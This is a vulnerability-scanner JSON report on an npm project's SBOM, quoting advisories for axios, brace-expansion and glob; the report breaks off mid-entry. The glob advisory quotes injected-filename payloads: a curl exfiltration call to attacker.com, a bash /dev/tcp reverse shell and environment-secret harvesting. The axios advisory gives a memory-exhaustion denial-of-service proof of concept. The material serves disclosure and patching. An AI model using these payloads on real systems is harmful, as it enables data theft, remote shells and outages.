Warning: --sbom has been deprecated in favor of -L
{
  "results": [
    {
      "source": {
        "path": "/sboms/IsThereAnyDeal__AugmentedSteam.spdx.json",
        "type": "sbom"
      },
      "packages": [
        {
          "package": {
            "name": "axios",
            "version": "1.9.0",
            "ecosystem": "npm"
          },
          "groups": [
            {
              "ids": [
                "GHSA-4hjh-wcwx-xvwj"
              ],
              "aliases": [
                "CVE-2025-58754",
                "GHSA-4hjh-wcwx-xvwj"
              ],
              "max_severity": "7.5"
            }
          ],
          "vulnerabilities": [
            {
              "affected": [
                {
                  "database_specific": {
                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/09/GHSA-4hjh-wcwx-xvwj/GHSA-4hjh-wcwx-xvwj.json"
                  },
                  "package": {
                    "ecosystem": "npm",
                    "name": "axios",
                    "purl": "pkg:npm/axios"
                  },
                  "ranges": [
                    {
                      "events": [
                        {
                          "introduced": "1.0.0"
                        },
                        {
                          "fixed": "1.12.0"
                        }
                      ],
                      "type": "SEMVER"
                    }
                  ]
                },
                {
                  "database_specific": {
                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/09/GHSA-4hjh-wcwx-xvwj/GHSA-4hjh-wcwx-xvwj.json"
                  },
                  "package": {
                    "ecosystem": "npm",
                    "name": "axios",
                    "purl": "pkg:npm/axios"
                  },
                  "ranges": [
                    {
                      "events": [
                        {
                          "introduced": "0"
                        },
                        {
                          "fixed": "0.30.2"
                        }
                      ],
                      "type": "SEMVER"
                    }
                  ]
                }
              ],
              "aliases": [
                "CVE-2025-58754"
              ],
              "database_specific": {
                "cwe_ids": [
                  "CWE-770"
                ],
                "github_reviewed": true,
                "github_reviewed_at": "2025-09-11T21:07:55Z",
                "nvd_published_at": "2025-09-12T02:15:46Z",
                "severity": "HIGH"
              },
              "details": "## Summary\n\nWhen Axios runs on Node.js and is given a URL with the `data:` scheme, it does not perform HTTP. Instead, its Node http adapter decodes the entire payload into memory (`Buffer`/`Blob`) and returns a synthetic 200 response.\nThis path ignores `maxContentLength` / `maxBodyLength` (which only protect HTTP responses), so an attacker can supply a very large `data:` URI and cause the process to allocate unbounded memory and crash (DoS), even if the caller requested `responseType: 'stream'`.\n\n## Details\n\nThe Node adapter (`lib/adapters/http.js`) supports the `data:` scheme. When `axios` encounters a request whose URL starts with `data:`, it does not perform an HTTP request. Instead, it calls `fromDataURI()` to decode the Base64 payload into a Buffer or Blob.\n\nRelevant code from [`[httpAdapter](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L231)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L231):\n\n```js\nconst fullPath = buildFullPath(config.baseURL, config.url, config.allowAbsoluteUrls);\nconst parsed = new URL(fullPath, platform.hasBrowserEnv ? platform.origin : undefined);\nconst protocol = parsed.protocol || supportedProtocols[0];\n\nif (protocol === 'data:') {\n  let convertedData;\n  if (method !== 'GET') {\n    return settle(resolve, reject, { status: 405, ... });\n  }\n  convertedData = fromDataURI(config.url, responseType === 'blob', {\n    Blob: config.env \u0026\u0026 config.env.Blob\n  });\n  return settle(resolve, reject, { data: convertedData, status: 200, ... });\n}\n```\n\nThe decoder is in [`[lib/helpers/fromDataURI.js](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/helpers/fromDataURI.js#L27)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/helpers/fromDataURI.js#L27):\n\n```js\nexport default function fromDataURI(uri, asBlob, options) {\n  ...\n  if (protocol === 'data') {\n    uri = protocol.length ? uri.slice(protocol.length + 1) : uri;\n    const match = DATA_URL_PATTERN.exec(uri);\n    ...\n    const body = match[3];\n    const buffer = Buffer.from(decodeURIComponent(body), isBase64 ? 'base64' : 'utf8');\n    if (asBlob) { return new _Blob([buffer], {type: mime}); }\n    return buffer;\n  }\n  throw new AxiosError('Unsupported protocol ' + protocol, ...);\n}\n```\n\n* The function decodes the entire Base64 payload into a Buffer with no size limits or sanity checks.\n* It does **not** honour `config.maxContentLength` or `config.maxBodyLength`, which only apply to HTTP streams.\n* As a result, a `data:` URI of arbitrary size can cause the Node process to allocate the entire content into memory.\n\nIn comparison, normal HTTP responses are monitored for size, the HTTP adapter accumulates the response into a buffer and will reject when `totalResponseBytes` exceeds [`[maxContentLength](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L550)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L550). No such check occurs for `data:` URIs.\n\n\n## PoC\n\n```js\nconst axios = require('axios');\n\nasync function main() {\n  // this example decodes ~120 MB\n  const base64Size = 160_000_000; // 120 MB after decoding\n  const base64 = 'A'.repeat(base64Size);\n  const uri = 'data:application/octet-stream;base64,' + base64;\n\n  console.log('Generating URI with base64 length:', base64.length);\n  const response = await axios.get(uri, {\n    responseType: 'arraybuffer'\n  });\n\n  console.log('Received bytes:', response.data.length);\n}\n\nmain().catch(err =\u003e {\n  console.error('Error:', err.message);\n});\n```\n\nRun with limited heap to force a crash:\n\n```bash\nnode --max-old-space-size=100 poc.js\n```\n\nSince Node heap is capped at 100 MB, the process terminates with an out-of-memory error:\n\n```\n\u003c--- Last few GCs ---\u003e\n…\nFATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory\n1: 0x… node::Abort() …\n…\n```\n\nMini Real App PoC:\nA small link-preview service that uses axios streaming, keep-alive agents, timeouts, and a JSON body. It allows data: URLs which axios fully ignore `maxContentLength `, `maxBodyLength` and decodes into memory on Node before streaming enabling DoS.\n\n```js\nimport express from \"express\";\nimport morgan from \"morgan\";\nimport axios from \"axios\";\nimport http from \"node:http\";\nimport https from \"node:https\";\nimport { PassThrough } from \"node:stream\";\n\nconst keepAlive = true;\nconst httpAgent = new http.Agent({ keepAlive, maxSockets: 100 });\nconst httpsAgent = new https.Agent({ keepAlive, maxSockets: 100 });\nconst axiosClient = axios.create({\n  timeout: 10000,\n  maxRedirects: 5,\n  httpAgent, httpsAgent,\n  headers: { \"User-Agent\": \"axios-poc-link-preview/0.1 (+node)\" },\n  validateStatus: c =\u003e c \u003e= 200 \u0026\u0026 c \u003c 400\n});\n\nconst app = express();\nconst PORT = Number(process.env.PORT || 8081);\nconst BODY_LIMIT = process.env.MAX_CLIENT_BODY || \"50mb\";\n\napp.use(express.json({ limit: BODY_LIMIT }));\napp.use(morgan(\"combined\"));\n\napp.get(\"/healthz\", (req,res)=\u003eres.send(\"ok\"));\n\n/**\n * POST /preview { \"url\": \"\u003chttp|https|data URL\u003e\" }\n * Uses axios streaming but if url is data:, axios fully decodes into memory first (DoS vector).\n */\n\napp.post(\"/preview\", async (req, res) =\u003e {\n  const url = req.body?.url;\n  if (!url) return res.status(400).json({ error: \"missing url\" });\n\n  let u;\n  try { u = new URL(String(url)); } catch { return res.status(400).json({ error: \"invalid url\" }); }\n\n  // Developer allows using data:// in the allowlist\n  const allowed = new Set([\"http:\", \"https:\", \"data:\"]);\n  if (!allowed.has(u.protocol)) return res.status(400).json({ error: \"unsupported scheme\" });\n\n  const controller = new AbortController();\n  const onClose = () =\u003e controller.abort();\n  res.on(\"close\", onClose);\n\n  const before = process.memoryUsage().heapUsed;\n\n  try {\n    const r = await axiosClient.get(u.toString(), {\n      responseType: \"stream\",\n      maxContentLength: 8 * 1024, // Axios will ignore this for data:\n      maxBodyLength: 8 * 1024,    // Axios will ignore this for data:\n      signal: controller.signal\n    });\n\n    // stream only the first 64KB back\n    const cap = 64 * 1024;\n    let sent = 0;\n    const limiter = new PassThrough();\n    r.data.on(\"data\", (chunk) =\u003e {\n      if (sent + chunk.length \u003e cap) { limiter.end(); r.data.destroy(); }\n      else { sent += chunk.length; limiter.write(chunk); }\n    });\n    r.data.on(\"end\", () =\u003e limiter.end());\n    r.data.on(\"error\", (e) =\u003e limiter.destroy(e));\n\n    const after = process.memoryUsage().heapUsed;\n    res.set(\"x-heap-increase-mb\", ((after - before)/1024/1024).toFixed(2));\n    limiter.pipe(res);\n  } catch (err) {\n    const after = process.memoryUsage().heapUsed;\n    res.set(\"x-heap-increase-mb\", ((after - before)/1024/1024).toFixed(2));\n    res.status(502).json({ error: String(err?.message || err) });\n  } finally {\n    res.off(\"close\", onClose);\n  }\n});\n\napp.listen(PORT, () =\u003e {\n  console.log(`axios-poc-link-preview listening on http://0.0.0.0:${PORT}`);\n  console.log(`Heap cap via NODE_OPTIONS, JSON limit via MAX_CLIENT_BODY (default ${BODY_LIMIT}).`);\n});\n```\nRun this app and send 3 post requests:\n```sh\nSIZE_MB=35 node -e 'const n=+process.env.SIZE_MB*1024*1024; const b=Buffer.alloc(n,65).toString(\"base64\"); process.stdout.write(JSON.stringify({url:\"data:application/octet-stream;base64,\"+b}))' \\\n| tee payload.json \u003e/dev/null\nseq 1 3 | xargs -P3 -I{} curl -sS -X POST \"$URL\" -H 'Content-Type: application/json' --data-binary @payload.json -o /dev/null```\n```\n\n---\n\n## Suggestions\n\n1. **Enforce size limits**\n   For `protocol === 'data:'`, inspect the length of the Base64 payload before decoding. If `config.maxContentLength` or `config.maxBodyLength` is set, reject URIs whose payload exceeds the limit.\n\n2. **Stream decoding**\n   Instead of decoding the entire payload in one `Buffer.from` call, decode the Base64 string in chunks using a streaming Base64 decoder. This would allow the application to process the data incrementally and abort if it grows too large.",
              "id": "GHSA-4hjh-wcwx-xvwj",
              "modified": "2025-09-29T19:03:57Z",
              "published": "2025-09-11T21:07:55Z",
              "references": [
                {
                  "type": "WEB",
                  "url": "https://github.com/axios/axios/security/advisories/GHSA-4hjh-wcwx-xvwj"
                },
                {
                  "type": "ADVISORY",
                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-58754"
                },
                {
                  "type": "WEB",
                  "url": "https://github.com/axios/axios/pull/7011"
                },
                {
                  "type": "WEB",
                  "url": "https://github.com/axios/axios/pull/7034"
                },
                {
                  "type": "WEB",
                  "url": "https://github.com/axios/axios/commit/945435fc51467303768202250debb8d4ae892593"
                },
                {
                  "type": "WEB",
                  "url": "https://github.com/axios/axios/commit/a1b1d3f073a988601583a604f5f9f5d05a3d0b67"
                },
                {
                  "type": "PACKAGE",
                  "url": "https://github.com/axios/axios"
                },
                {
                  "type": "WEB",
                  "url": "https://github.com/axios/axios/releases/tag/v0.30.2"
                },
                {
                  "type": "WEB",
                  "url": "https://github.com/axios/axios/releases/tag/v1.12.0"
                }
              ],
              "related": [
                "CGA-82cq-c7r6-q67x",
                "CGA-g599-6c37-mmm7",
                "CGA-jw4w-h92g-894c",
                "CGA-pvgv-p58w-27vj",
                "CGA-q8ch-84qh-r7r2",
                "CVE-2025-58754"
              ],
              "schema_version": "1.7.3",
              "severity": [
                {
                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
                  "type": "CVSS_V3"
                }
              ],
              "summary": "Axios is vulnerable to DoS attack through lack of data size check"
            }
          ]
        },
        {
          "package": {
            "name": "brace-expansion",
            "version": "1.1.11",
            "ecosystem": "npm"
          },
          "groups": [
            {
              "ids": [
                "GHSA-v6h2-p8h4-qcjw"
              ],
              "aliases": [
                "CVE-2025-5889",
                "GHSA-v6h2-p8h4-qcjw"
              ],
              "max_severity": "3.1"
            }
          ],
          "vulnerabilities": [
            {
              "affected": [
                {
                  "database_specific": {
                    "last_known_affected_version_range": "\u003c= 2.0.1",
                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-v6h2-p8h4-qcjw/GHSA-v6h2-p8h4-qcjw.json"
                  },
                  "package": {
                    "ecosystem": "npm",
                    "name": "brace-expansion",
                    "purl": "pkg:npm/brace-expansion"
                  },
                  "ranges": [
                    {
                      "events": [
                        {
                          "introduced": "2.0.0"
                        },
                        {
                          "fixed": "2.0.2"
                        }
                      ],
                      "type": "SEMVER"
                    }
                  ]
                },
                {
                  "database_specific": {
                    "last_known_affected_version_range": "\u003c= 1.1.11",
                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-v6h2-p8h4-qcjw/GHSA-v6h2-p8h4-qcjw.json"
                  },
                  "package": {
                    "ecosystem": "npm",
                    "name": "brace-expansion",
                    "purl": "pkg:npm/brace-expansion"
                  },
                  "ranges": [
                    {
                      "events": [
                        {
                          "introduced": "1.0.0"
                        },
                        {
                          "fixed": "1.1.12"
                        }
                      ],
                      "type": "SEMVER"
                    }
                  ]
                },
                {
                  "database_specific": {
                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-v6h2-p8h4-qcjw/GHSA-v6h2-p8h4-qcjw.json"
                  },
                  "package": {
                    "ecosystem": "npm",
                    "name": "brace-expansion",
                    "purl": "pkg:npm/brace-expansion"
                  },
                  "ranges": [
                    {
                      "events": [
                        {
                          "introduced": "3.0.0"
                        },
                        {
                          "fixed": "3.0.1"
                        }
                      ],
                      "type": "SEMVER"
                    }
                  ],
                  "versions": [
                    "3.0.0"
                  ]
                },
                {
                  "database_specific": {
                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-v6h2-p8h4-qcjw/GHSA-v6h2-p8h4-qcjw.json"
                  },
                  "package": {
                    "ecosystem": "npm",
                    "name": "brace-expansion",
                    "purl": "pkg:npm/brace-expansion"
                  },
                  "ranges": [
                    {
                      "events": [
                        {
                          "introduced": "4.0.0"
                        },
                        {
                          "fixed": "4.0.1"
                        }
                      ],
                      "type": "SEMVER"
                    }
                  ],
                  "versions": [
                    "4.0.0"
                  ]
                }
              ],
              "aliases": [
                "CVE-2025-5889"
              ],
              "database_specific": {
                "cwe_ids": [
                  "CWE-400"
                ],
                "github_reviewed": true,
                "github_reviewed_at": "2025-06-10T22:51:59Z",
                "nvd_published_at": "2025-06-09T19:15:25Z",
                "severity": "LOW"
              },
              "details": "A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component.",
              "id": "GHSA-v6h2-p8h4-qcjw",
              "modified": "2025-06-11T20:54:10Z",
              "published": "2025-06-09T21:30:51Z",
              "references": [
                {
                  "type": "ADVISORY",
                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-5889"
                },
                {
                  "type": "WEB",
                  "url": "https://github.com/juliangruber/brace-expansion/pull/65/commits/a5b98a4f30d7813266b221435e1eaaf25a1b0ac5"
                },
                {
                  "type": "WEB",
                  "url": "https://github.com/juliangruber/brace-expansion/commit/0b6a9781e18e9d2769bb2931f4856d1360243ed2"
                },
                {
                  "type": "WEB",
                  "url": "https://github.com/juliangruber/brace-expansion/commit/15f9b3c75ebf5988198241fecaebdc45eff28a9f"
                },
                {
                  "type": "WEB",
                  "url": "https://github.com/juliangruber/brace-expansion/commit/36603d5f3599a37af9e85eda30acd7d28599c36e"
                },
                {
                  "type": "WEB",
                  "url": "https://github.com/juliangruber/brace-expansion/commit/c3c73c8b088defc70851843be88ccc3af08e7217"
                },
                {
                  "type": "WEB",
                  "url": "https://gist.github.com/mmmsssttt404/37a40ce7d6e5ca604858fe30814d9466"
                },
                {
                  "type": "PACKAGE",
                  "url": "https://github.com/juliangruber/brace-expansion"
                },
                {
                  "type": "WEB",
                  "url": "https://vuldb.com/?ctiid.311660"
                },
                {
                  "type": "WEB",
                  "url": "https://vuldb.com/?id.311660"
                },
                {
                  "type": "WEB",
                  "url": "https://vuldb.com/?submit.585717"
                }
              ],
              "related": [
                "CGA-48f6-2xrx-cxvw",
                "CGA-53f7-rx58-5rx6",
                "CGA-5489-g42r-jj95",
                "CGA-6q97-x38p-2v36",
                "CGA-8v3m-9726-pcqj",
                "CGA-9w98-92pm-h3wg",
                "CGA-gwp3-55v6-p25f",
                "CGA-hvx5-j33w-wf72",
                "CGA-jq8h-hpf9-qxxv",
                "CGA-jv3c-567r-7fr7",
                "CGA-mvmv-c4pf-vgpr",
                "CGA-p2f9-h939-jv5f",
                "CGA-vr9h-m8qm-5mj9",
                "CGA-x49c-f2g9-2gqg",
                "CGA-x9mj-gpvv-mx29",
                "CGA-xc8g-m7h6-2rp6",
                "CGA-xqvv-5w52-gqqq"
              ],
              "schema_version": "1.7.3",
              "severity": [
                {
                  "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L",
                  "type": "CVSS_V3"
                },
                {
                  "score": "CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
                  "type": "CVSS_V4"
                }
              ],
              "summary": "brace-expansion Regular Expression Denial of Service vulnerability"
            }
          ]
        },
        {
          "package": {
            "name": "brace-expansion",
            "version": "2.0.1",
            "ecosystem": "npm"
          },
          "groups": [
            {
              "ids": [
                "GHSA-v6h2-p8h4-qcjw"
              ],
              "aliases": [
                "CVE-2025-5889",
                "GHSA-v6h2-p8h4-qcjw"
              ],
              "max_severity": "3.1"
            }
          ],
          "vulnerabilities": [
            {
              "affected": [
                {
                  "database_specific": {
                    "last_known_affected_version_range": "\u003c= 2.0.1",
                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-v6h2-p8h4-qcjw/GHSA-v6h2-p8h4-qcjw.json"
                  },
                  "package": {
                    "ecosystem": "npm",
                    "name": "brace-expansion",
                    "purl": "pkg:npm/brace-expansion"
                  },
                  "ranges": [
                    {
                      "events": [
                        {
                          "introduced": "2.0.0"
                        },
                        {
                          "fixed": "2.0.2"
                        }
                      ],
                      "type": "SEMVER"
                    }
                  ]
                },
                {
                  "database_specific": {
                    "last_known_affected_version_range": "\u003c= 1.1.11",
                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-v6h2-p8h4-qcjw/GHSA-v6h2-p8h4-qcjw.json"
                  },
                  "package": {
                    "ecosystem": "npm",
                    "name": "brace-expansion",
                    "purl": "pkg:npm/brace-expansion"
                  },
                  "ranges": [
                    {
                      "events": [
                        {
                          "introduced": "1.0.0"
                        },
                        {
                          "fixed": "1.1.12"
                        }
                      ],
                      "type": "SEMVER"
                    }
                  ]
                },
                {
                  "database_specific": {
                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-v6h2-p8h4-qcjw/GHSA-v6h2-p8h4-qcjw.json"
                  },
                  "package": {
                    "ecosystem": "npm",
                    "name": "brace-expansion",
                    "purl": "pkg:npm/brace-expansion"
                  },
                  "ranges": [
                    {
                      "events": [
                        {
                          "introduced": "3.0.0"
                        },
                        {
                          "fixed": "3.0.1"
                        }
                      ],
                      "type": "SEMVER"
                    }
                  ],
                  "versions": [
                    "3.0.0"
                  ]
                },
                {
                  "database_specific": {
                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-v6h2-p8h4-qcjw/GHSA-v6h2-p8h4-qcjw.json"
                  },
                  "package": {
                    "ecosystem": "npm",
                    "name": "brace-expansion",
                    "purl": "pkg:npm/brace-expansion"
                  },
                  "ranges": [
                    {
                      "events": [
                        {
                          "introduced": "4.0.0"
                        },
                        {
                          "fixed": "4.0.1"
                        }
                      ],
                      "type": "SEMVER"
                    }
                  ],
                  "versions": [
                    "4.0.0"
                  ]
                }
              ],
              "aliases": [
                "CVE-2025-5889"
              ],
              "database_specific": {
                "cwe_ids": [
                  "CWE-400"
                ],
                "github_reviewed": true,
                "github_reviewed_at": "2025-06-10T22:51:59Z",
                "nvd_published_at": "2025-06-09T19:15:25Z",
                "severity": "LOW"
              },
              "details": "A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component.",
              "id": "GHSA-v6h2-p8h4-qcjw",
              "modified": "2025-06-11T20:54:10Z",
              "published": "2025-06-09T21:30:51Z",
              "references": [
                {
                  "type": "ADVISORY",
                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-5889"
                },
                {
                  "type": "WEB",
                  "url": "https://github.com/juliangruber/brace-expansion/pull/65/commits/a5b98a4f30d7813266b221435e1eaaf25a1b0ac5"
                },
                {
                  "type": "WEB",
                  "url": "https://github.com/juliangruber/brace-expansion/commit/0b6a9781e18e9d2769bb2931f4856d1360243ed2"
                },
                {
                  "type": "WEB",
                  "url": "https://github.com/juliangruber/brace-expansion/commit/15f9b3c75ebf5988198241fecaebdc45eff28a9f"
                },
                {
                  "type": "WEB",
                  "url": "https://github.com/juliangruber/brace-expansion/commit/36603d5f3599a37af9e85eda30acd7d28599c36e"
                },
                {
                  "type": "WEB",
                  "url": "https://github.com/juliangruber/brace-expansion/commit/c3c73c8b088defc70851843be88ccc3af08e7217"
                },
                {
                  "type": "WEB",
                  "url": "https://gist.github.com/mmmsssttt404/37a40ce7d6e5ca604858fe30814d9466"
                },
                {
                  "type": "PACKAGE",
                  "url": "https://github.com/juliangruber/brace-expansion"
                },
                {
                  "type": "WEB",
                  "url": "https://vuldb.com/?ctiid.311660"
                },
                {
                  "type": "WEB",
                  "url": "https://vuldb.com/?id.311660"
                },
                {
                  "type": "WEB",
                  "url": "https://vuldb.com/?submit.585717"
                }
              ],
              "related": [
                "CGA-48f6-2xrx-cxvw",
                "CGA-53f7-rx58-5rx6",
                "CGA-5489-g42r-jj95",
                "CGA-6q97-x38p-2v36",
                "CGA-8v3m-9726-pcqj",
                "CGA-9w98-92pm-h3wg",
                "CGA-gwp3-55v6-p25f",
                "CGA-hvx5-j33w-wf72",
                "CGA-jq8h-hpf9-qxxv",
                "CGA-jv3c-567r-7fr7",
                "CGA-mvmv-c4pf-vgpr",
                "CGA-p2f9-h939-jv5f",
                "CGA-vr9h-m8qm-5mj9",
                "CGA-x49c-f2g9-2gqg",
                "CGA-x9mj-gpvv-mx29",
                "CGA-xc8g-m7h6-2rp6",
                "CGA-xqvv-5w52-gqqq"
              ],
              "schema_version": "1.7.3",
              "severity": [
                {
                  "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L",
                  "type": "CVSS_V3"
                },
                {
                  "score": "CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
                  "type": "CVSS_V4"
                }
              ],
              "summary": "brace-expansion Regular Expression Denial of Service vulnerability"
            }
          ]
        },
        {
          "package": {
            "name": "glob",
            "version": "10.3.10",
            "ecosystem": "npm"
          },
          "groups": [
            {
              "ids": [
                "GHSA-5j98-mcp5-4vw2"
              ],
              "aliases": [
                "CVE-2025-64756",
                "GHSA-5j98-mcp5-4vw2"
              ],
              "max_severity": "7.5"
            }
          ],
          "vulnerabilities": [
            {
              "affected": [
                {
                  "database_specific": {
                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-5j98-mcp5-4vw2/GHSA-5j98-mcp5-4vw2.json"
                  },
                  "package": {
                    "ecosystem": "npm",
                    "name": "glob",
                    "purl": "pkg:npm/glob"
                  },
                  "ranges": [
                    {
                      "events": [
                        {
                          "introduced": "11.0.0"
                        },
                        {
                          "fixed": "11.1.0"
                        }
                      ],
                      "type": "SEMVER"
                    }
                  ]
                },
                {
                  "database_specific": {
                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-5j98-mcp5-4vw2/GHSA-5j98-mcp5-4vw2.json"
                  },
                  "package": {
                    "ecosystem": "npm",
                    "name": "glob",
                    "purl": "pkg:npm/glob"
                  },
                  "ranges": [
                    {
                      "events": [
                        {
                          "introduced": "10.2.0"
                        },
                        {
                          "fixed": "10.5.0"
                        }
                      ],
                      "type": "SEMVER"
                    }
                  ]
                }
              ],
              "aliases": [
                "CVE-2025-64756"
              ],
              "database_specific": {
                "cwe_ids": [
                  "CWE-78"
                ],
                "github_reviewed": true,
                "github_reviewed_at": "2025-11-17T17:38:56Z",
                "nvd_published_at": "2025-11-17T18:15:58Z",
                "severity": "HIGH"
              },
              "details": "### Summary\n\nThe glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names. When `glob -c \u003ccommand\u003e \u003cpatterns\u003e` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:\n\n```javascript\nstream.on('end', () =\u003e foregroundChild(cmd, matches, { shell: true }))\n```\n\n**Technical Flow:**\n1. User runs `glob -c \u003ccommand\u003e \u003cpattern\u003e` \n2. CLI finds files matching the pattern\n3. Matched filenames are collected into an array\n4. Command is executed with matched filenames as arguments using `shell: true`\n5. Shell interprets metacharacters in filenames as command syntax\n6. Malicious filenames execute arbitrary commands\n\n**Affected Component:**\n- **CLI Only:** The vulnerability affects only the command-line interface\n- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected\n- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)\n\n**Attack Surface:**\n- Files with names containing shell metacharacters: `$()`, backticks, `;`, `\u0026`, `|`, etc.\n- Any directory where attackers can control filenames (PR branches, archives, user uploads)\n- CI/CD pipelines using `glob -c` on untrusted content\n\n### PoC\n\n**Setup Malicious File:**\n```bash\nmkdir test_directory \u0026\u0026 cd test_directory\n\n# Create file with command injection payload in filename\ntouch '$(touch injected_poc)'\n```\n\n**Trigger Vulnerability:**\n```bash\n# Run glob CLI with -c option\nnode /path/to/glob/dist/esm/bin.mjs -c echo \"**/*\"\n```\n\n**Result:**\n- The echo command executes normally\n- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell\n- A new file `injected_poc` is created, proving command execution\n- Any command can be injected this way with full user privileges\n\n**Advanced Payload Examples:**\n\n**Data Exfiltration:**\n```bash\n# Filename: $(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" \u003e /dev/null 2\u003e\u00261)\ntouch '$(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" \u003e /dev/null 2\u003e\u00261)'\n```\n\n**Reverse Shell:**\n```bash\n# Filename: $(bash -i \u003e\u0026 /dev/tcp/attacker.com/4444 0\u003e\u00261)\ntouch '$(bash -i \u003e\u0026 /dev/tcp/attacker.com/4444 0\u003e\u00261)'\n```\n\n**Environment Variable Harvesting:**\n```bash\n# Filename: $(env | grep -E \"(TOKEN|KEY|SECRET)\" \u003e /tmp/secrets.txt)\ntouch '$(env | grep -E \"(TOKEN|KEY|SECRET)\" \u003e /tmp/secrets.txt)'\n```\n\n### Impact\n\n**Arbitrary Command Execution:**\n- Commands execute with full privileges of the user running glob CLI\n- No privilege escalation required - runs as current user\n- Access to environment variables, file system, and network\n\n**Real-World Attack Scenarios:**\n\n**1. CI/CD Pipeline Compromise:**\n- Malicious PR adds files with crafted names to repository\n- CI pipeline uses `glob -c` to process files (linting, testing, deployment)\n- Commands execute in CI environment with build secrets and deployment credentials\n- Potential for supply chain compromise through artifact tampering\n\n**2. Developer Workstation Attack:**\n- Developer clones repository or extracts archive containing malicious filenames\n- Local build scripts use `glob -c` for file processing\n- Developer machine compromise with access to SSH keys, tokens, local services\n\n**3. Automated Processing Systems:**\n- Services using glob CLI to process uploaded files or external content\n- File uploads with malicious names trigger command execution\n- Server-side compromise with potential for lateral movement\n\n**4. Supply Chain Poisoning:**\n- Malicious packages or themes include files with crafted names\n- Build processes using glob CLI automatically process these files\n- Wide distribution of compromise through package ecosystems\n\n**Platform-Specific Risks:**\n- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing\n- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL\n- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** glob\n- **Component:** CLI only (`src/bin.mts`)\n- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)\n- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)\n- **Patched versions:** 11.1.0and 10.5.0\n\n**Scope Limitation:**\n- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe\n- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable\n\n### Remediation\n\n- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.\n- If 